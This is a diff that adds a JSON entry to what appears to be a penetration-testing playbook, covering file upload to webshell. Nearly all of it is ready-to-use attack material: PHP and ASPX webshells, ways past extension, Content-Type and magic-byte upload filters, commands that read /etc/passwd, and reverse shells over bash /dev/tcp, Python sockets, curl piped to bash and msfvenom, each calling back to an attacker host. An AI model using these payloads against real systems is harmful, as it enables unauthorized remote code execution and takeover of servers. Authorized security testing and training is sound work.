@@ -1,0 +1,30 @@
+{
+  "id": "file_upload",
+  "phase": "WEB",
+  "title": "File Upload → Webshell",
+  "body": "Two problems to solve: (1) get the file accepted, (2) find where it landed. Work them in parallel. Check source code and intercept responses for upload paths before fuzzing blind.",
+  "cmd": "# ── STEP 1: FIND WHERE FILES GO ───────────────────────\n# Check the page source BEFORE uploading — look for hints\ncurl -s http://$ip/upload.php | grep -i \"upload\\|path\\|dir\\|folder\\|dest\"\n\n# After uploading a test file, check the response\n# Burp: look at the response body for a URL or path\n# Common paths to check immediately:\ncurl http://$ip/uploads/test.txt\ncurl http://$ip/upload/test.txt\ncurl http://$ip/files/test.txt\ncurl http://$ip/images/test.txt\ncurl http://$ip/media/test.txt\ncurl http://$ip/assets/test.txt\ncurl http://$ip/static/test.txt\ncurl http://$ip/data/test.txt\ncurl http://$ip/tmp/test.txt\ncurl http://$ip/temp/test.txt\n\n# Fuzz for the upload directory after uploading\nffuf -u http://$ip/FUZZ/test.txt \\\n  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -mc 200 -fs 0\n\n# If filename is preserved — fuzz with your filename\nffuf -u http://$ip/FUZZ/shell.php \\\n  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -mc 200\n\n# Check if app reveals path in response headers or body\ncurl -v http://$ip/upload.php -X POST -F \"file=@test.txt\" 2>&1 | grep -i \"location\\|path\\|url\\|href\"\n\n# ── STEP 2: PHP WEBSHELL PAYLOADS ─────────────────────\n# Simple command execution — GET parameter\n<?php system($_GET['cmd']); ?>\n\n# POST parameter (harder to detect in logs)\n<?php system($_POST['cmd']); ?>\n\n# Both GET and POST\n<?php system($_REQUEST['cmd']); ?>\n\n# Passthru — alternative to system()\n<?php passthru($_GET['cmd']); ?>\n\n# Shell_exec — returns output as string\n<?php echo shell_exec($_GET['cmd']); ?>\n\n# Exec — only returns last line\n<?php exec($_GET['cmd'], $out); echo implode(\"\n\", $out); ?>\n\n# Full featured — accepts cmd via POST, shows output\n<?php if(isset($_POST['cmd'])){echo '<pre>'.shell_exec($_POST['cmd']).'</pre>';}?>\n\n# One-liner reverse shell via webshell\n# First: set up listener: sudo nc -lvnp 443\n# Then hit: http://$ip/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/443+0>%261'\n\n# ── STEP 3: BYPASS FILTER — EXTENSION ────────────────\n# Try in order:\n.php\n.php3\n.php4\n.php5\n.php7\n.phtml\n.phar\n.shtml\n.cgi\n\n# Double extension (server processes first dot)\nshell.php.jpg\nshell.php.png\nshell.php.gif\n\n# Null byte — older PHP/servers\nshell.php%00.jpg\nshell.php\u0000.jpg\n\n# Case variation\nshell.PHP\nshell.Php\nshell.pHp\n\n# ── STEP 4: BYPASS FILTER — CONTENT-TYPE ─────────────\n# In Burp — change Content-Type header after upload accepted\n# Change: application/x-php\n# To:     image/jpeg   OR   image/png   OR   image/gif\n\n# curl with spoofed content type\ncurl http://$ip/upload.php \\\n  -F \"file=@shell.php;type=image/jpeg\"\n\n# ── STEP 5: MAGIC BYTES BYPASS ───────────────────────\n# Prepend image magic bytes so file reads as an image\n# GIF89a — most common bypass\nprintf 'GIF89a\n<?php system($_GET[\"cmd\"]); ?>' > shell.php.gif\n\n# PNG magic bytes\nprintf 'PNG\r\n\u001a\n<?php system($_GET[\"cmd\"]); ?>' > shell.png.php\n\n# JPEG magic bytes\nprintf 'ÿØÿ<?php system($_GET[\"cmd\"]); ?>' > shell.jpg.php\n\n# exiftool — embed PHP in image metadata\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg\nmv image.jpg shell.php.jpg\n\n# ── STEP 6: EXECUTE THE SHELL ─────────────────────────\n# Simple command test\ncurl \"http://$ip/uploads/shell.php?cmd=id\"\ncurl \"http://$ip/uploads/shell.php?cmd=whoami\"\ncurl \"http://$ip/uploads/shell.php?cmd=ls+-la\"\n\n# URL encode spaces and special chars\ncurl \"http://$ip/uploads/shell.php?cmd=cat+/etc/passwd\"\ncurl \"http://$ip/uploads/shell.php?cmd=cat%20/etc/passwd\"\n\n# POST method\ncurl -X POST http://$ip/uploads/shell.php -d \"cmd=id\"\n\n# ── STEP 7: UPGRADE TO REVERSE SHELL ─────────────────\n# Listener on Kali\nsudo nc -lvnp 443\n\n# Bash reverse shell via webshell (URL encoded)\ncurl \"http://$ip/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/443+0>%261'\"\n\n# Python reverse shell via webshell\ncurl \"http://$ip/uploads/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect((\"$lhost\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\"\n\n# Serve shell.sh and execute it\necho 'bash -i >& /dev/tcp/$lhost/443 0>&1' > shell.sh\npython3 -m http.server 8000\n# Then via webshell:\ncurl \"http://$ip/uploads/shell.php?cmd=curl+http://$lhost:8000/shell.sh|bash\"\n\n# ── STEP 8: WINDOWS ASPX / ASP SHELLS ────────────────\n# ASPX webshell — use for IIS targets\n# msfvenom generated:\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$lhost LPORT=443 -f aspx -o shell.aspx\n\n# Simple ASPX cmd shell (copy-paste)\n# <%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %>\n# <% Response.Write(new Process(){StartInfo=new ProcessStartInfo(\"cmd.exe\",\"/c \"+Request[\"cmd\"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd()); %>\n\n# Execute\ncurl \"http://$ip/uploads/shell.aspx?cmd=whoami\"",
+  "warn": "Always check the HTTP response after uploading — the path is often in the response body or Location header. If you can't find the upload dir, upload a unique filename then fuzz for it. Magic bytes bypass works when server checks file content but not extension. exiftool embed is stealthier than a naked PHP file.",
+  "choices": [
+    {
+      "label": "Got webshell executing commands",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "Uploaded but can't find the file",
+      "next": "web_fuzz_deep"
+    },
+    {
+      "label": "Extension blocked — try LFI instead",
+      "next": "lfi"
+    },
+    {
+      "label": "IIS target — ASPX path",
+      "next": "iis_aspx"
+    },
+    {
+      "label": "Need to upgrade to reverse shell",
+      "next": "reverse_shell"
+    }
+  ]
+}
